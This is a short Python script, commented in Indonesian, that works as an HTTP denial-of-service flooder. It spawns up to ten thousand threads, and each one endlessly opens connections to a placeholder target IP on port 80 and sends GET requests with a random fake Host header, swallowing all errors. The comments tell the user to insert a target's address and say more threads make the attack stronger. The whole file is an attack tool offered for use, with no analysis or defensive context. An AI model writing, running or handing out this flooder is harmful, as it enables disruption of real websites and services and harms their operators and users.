import socket
import random
import threading

target_ip = "IP_TARGET_DISINI"  # Ganti dengan alamat IP target
target_port = 80  # Ganti dengan port target (80 untuk HTTP biasa)
fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except Exception as e:
            # Terus mencoba meskipun ada error
            pass

# Menjalankan banyak thread untuk serangan yang lebih kuat
for i in range(10000):  # Jumlah thread yang sangat besar
    thread = threading.Thread(target=attack)
    thread.start()
    thread.join(timeout=0.001)